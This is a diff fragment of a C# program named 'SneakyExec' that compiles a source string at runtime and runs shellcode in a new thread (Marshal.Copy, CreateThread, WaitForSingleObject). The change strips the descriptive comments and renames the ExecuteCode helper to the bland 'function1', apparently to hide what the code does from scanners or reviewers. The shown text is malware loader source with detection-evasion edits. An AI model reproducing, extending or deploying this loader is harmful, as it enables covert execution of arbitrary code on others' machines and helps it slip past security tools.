@@ -54,24 +54,18 @@ namespace SneakyExec
                                         Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                                         IntPtr hThread = IntPtr.Zero;
                                         UInt32 threadId = 0;
-                                        // prepare data
-
-
                                         IntPtr pinfo = IntPtr.Zero;
-
-                                        // execute native code
-
                                         hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                                         WaitForSingleObject(hThread, 0xFFFFFFFF);
                                     }
                                 }
                             }";
-            ExecuteCode(code, "Namespace", "Program", "run", false, null);
+            function1(code, "Namespace", "Program", "run", false, null);
          }
 
         
 
-        public static object ExecuteCode(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
+        public static object function1(string code, string namespacename, string classname, string functionname, bool isstatic, params object[] args)
         {
             object returnval = null;
             Assembly asm = BuildAssembly(code);
